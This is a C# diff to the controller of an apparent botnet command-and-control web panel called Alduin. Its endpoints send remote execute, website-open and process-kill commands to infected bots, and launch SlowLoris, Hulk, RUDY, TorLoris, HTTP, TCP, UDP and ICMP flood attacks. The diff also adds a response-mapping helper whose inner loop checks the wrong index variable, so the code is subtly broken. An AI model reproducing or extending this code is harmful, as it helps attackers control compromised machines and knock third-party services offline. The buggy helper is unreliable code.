@@ -10,6 +10,8 @@ using Alduin.Logic.Mediator.Queries;
 using Newtonsoft.Json;
 using Alduin.Server.Commands.Floods;
 using Alduin.Server.Commands.Commands;
+using System.Collections.Generic;
+using Alduin.Shared.DTOs;
 
 namespace Alduin.Web.Controllers
 {
@@ -200,7 +202,7 @@ namespace Alduin.Web.Controllers
         //Executes/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteCommand(ExecuteModel model)
+        public async Task<IActionResult> ExecuteCommand([FromForm] ExecuteModel model)
         {
             if (!ModelState.IsValid)
                 return View(model);
@@ -230,11 +232,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(ExecuteCommand).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> WebOpenCommand(WebsiteModel model)
+        public async Task<IActionResult> WebOpenCommand([FromForm] WebsiteModel model)
         {
             if (!ModelState.IsValid)
                 return View(model);
@@ -250,7 +252,7 @@ namespace Alduin.Web.Controllers
             };
             var method = new BaseCommands
             {
-                Method = "Execute"
+                Method = "Website"
             };
             var command = new WebsiteOpenModel
             {
@@ -262,12 +264,12 @@ namespace Alduin.Web.Controllers
                 status = model.Force
             };
             var botlist = await _mediator.Send(bots);
-            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(command).Replace(@"\", ""));
-            return Json(response);
+            CommandResponseModel[] response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(command).Replace(@"\", ""));
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> SendMessageCommand(MessageModel model)
+        public async Task<IActionResult> SendMessageCommand([FromForm] MessageModel model)
         {
             var method = new BaseCommands
             {
@@ -289,11 +291,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(messageCommand).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteArme(ArmeModel model)
+        public async Task<IActionResult> ExecuteArme([FromForm] ArmeModel model)
         {
             var method = new BaseCommands
             {
@@ -324,11 +326,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteSlowLoris(SlowLorisModel model)
+        public async Task<IActionResult> ExecuteSlowLoris([FromForm] SlowLorisModel model)
         {
             var method = new BaseCommands
             {
@@ -359,11 +361,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteHttpBandWidth(HttpBandWidthModel model)
+        public async Task<IActionResult> ExecuteHttpBandWidth([FromForm] HttpBandWidthModel model)
         {
             var method = new BaseCommands
             {
@@ -394,11 +396,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteHulk(HulkModel model)
+        public async Task<IActionResult> ExecuteHulk([FromForm] HulkModel model)
         {
             var method = new BaseCommands
             {
@@ -429,11 +431,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteTorLoris(TorLorisModel model)
+        public async Task<IActionResult> ExecuteTorLoris([FromForm] TorLorisModel model)
         {
             var method = new BaseCommands
             {
@@ -464,11 +466,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteRudy(RudyModel model)
+        public async Task<IActionResult> ExecuteRudy([FromForm] RudyModel model)
         {
             var method = new BaseCommands
             {
@@ -497,11 +499,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteTcp(TcpModel model)
+        public async Task<IActionResult> ExecuteTcp([FromForm] TcpModel model)
         {
             var method = new BaseCommands
             {
@@ -530,11 +532,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteUdp(UdpModel model)
+        public async Task<IActionResult> ExecuteUdp([FromForm] UdpModel model)
         {
             var method = new BaseCommands
             {
@@ -563,11 +565,11 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> ExecuteIcmp(IcmpModel model)
+        public async Task<IActionResult> ExecuteIcmp([FromForm] IcmpModel model)
         {
             var method = new BaseCommands
             {
@@ -596,7 +598,7 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
         [HttpPost]
@@ -622,10 +624,10 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
-            return Json(response);
+            return Json(OverWriterResponse(response, botlist));
         }
         [Authorize]
-        [HttpPost]
+        [HttpGet]
         public async Task<IActionResult> KillProcess(int procId)
         {
             var method = new BaseCommands
@@ -649,6 +651,26 @@ namespace Alduin.Web.Controllers
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
             return Json(response);
         }
-
+        public CommandResponseModel[] OverWriterResponse(CommandResponseModel[] response, BotDTO[] botlist)
+        {
+            for (var i = 0; i < response.Length; i++)
+            {
+                for (var j = 0; i < botlist.Length; j++)
+                {
+                    if (response[i].KeyUnique == botlist[j].KeyUnique)
+                    {
+                        response[i].KeyUnique = botlist[j].UserName;
+                        break;
+                    }
+                        
+                    if (response[i].KeyUnique == null)
+                    {
+                        response[i].KeyUnique = "Server";
+                        break;
+                    }
+                }
+            }
+            return response;
+        }
     }
 }
